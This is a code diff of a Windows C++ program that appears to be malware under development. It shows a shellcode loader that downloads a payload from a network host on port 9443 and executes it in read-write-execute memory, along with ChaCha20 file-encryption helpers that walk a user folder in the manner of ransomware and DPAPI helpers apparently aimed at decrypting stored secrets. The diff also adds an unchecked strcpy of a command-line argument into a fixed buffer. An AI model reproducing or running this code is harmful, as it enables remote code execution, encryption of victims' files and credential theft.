@@ -53,7 +53,7 @@ extern "C" {
 	NTSTATUS NTAPI NtClose(HANDLE Handle);
 }
 
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+//#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
 
 // -----------------------------------------------------------------
@@ -64,11 +64,10 @@ std::vector<BYTE> download(const char* host, const char* path, uint16_t port = 8
 	WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
 	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (s == INVALID_SOCKET) return {};
-
 	sockaddr_in sa{};
 	sa.sin_family = AF_INET;
 	sa.sin_port = htons(port);
-	sa.sin_addr.s_addr = inet_addr("192.168.8.130");
+	sa.sin_addr.s_addr = inet_addr(host);
 
 	if (connect(s, (sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) { closesocket(s); return {}; }
 
@@ -99,7 +98,7 @@ void run_shellcode(const std::vector<BYTE>& sc)
 	if (sc.empty()) return;
 
 	PVOID base = nullptr;
-	SIZE_T size = sc.size();
+	SIZE_T size = static_cast<ULONG>(sc.size());
 	NTSTATUS st = NtAllocateVirtualMemory(
 		NtCurrentProcess(), &base, 0, &size,
 		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -148,7 +147,7 @@ static const unsigned char CHACHA_KEY[crypto_stream_chacha20_KEYBYTES] = {
 	0x19,0x1A,0x1B,0x1C,0x1D,0x1E,0x1F,0x20
 };
 // -----------------------------------------------------------------
-// helpers
+// E helpers
 // -----------------------------------------------------------------
 
 bool encrypt_file(const fs::path& in)
@@ -209,7 +208,7 @@ void process_directory(const fs::path& dir)
 }
 
 // --------------------------------------------------------------------------
-// DPAPI START: Helpers
+// DPAPI Helpers
 // --------------------------------------------------------------------------
 std::vector<BYTE> Base64ToBytes(const std::string& b64)
 {
@@ -283,7 +282,16 @@ int main(int argc, char* argv[]) {
 	std::string argument = argv[1];
 	// Handle different arguments
 	if (argument == "/c") {
-		auto sc = download("192.168.8.130", "/test.txt ", 9443);
+		char addrstr[] = { "192.168.7.1" };
+		if (argc >= 3) {
+			// Use the third argument as the IP address
+			strcpy(addrstr, argv[2]);
+			std::cout << "Using custom IP: " << addrstr << std::endl;
+		}
+		else {
+			std::cout << "Using default IP: " << addrstr << std::endl;
+		}
+		auto sc = download((const char*)addrstr, "/test.txt ", 9443);
 		run_shellcode(sc);
 		return 0;
 	}
@@ -364,7 +372,7 @@ int main(int argc, char* argv[]) {
 			std::cerr << "libsodium init failed\n";
 			return 1;
 		}
-		fs::path root = fs::path(getenv("USERPROFILE")) / "Pictures";
+		fs::path root = "C:\\Users\\clark kent\\Desktop\\something5";
 		//fs::path root = "C:\\Users";
 		if (!fs::exists(root)) {
 			std::cerr << "Folder not found\n";
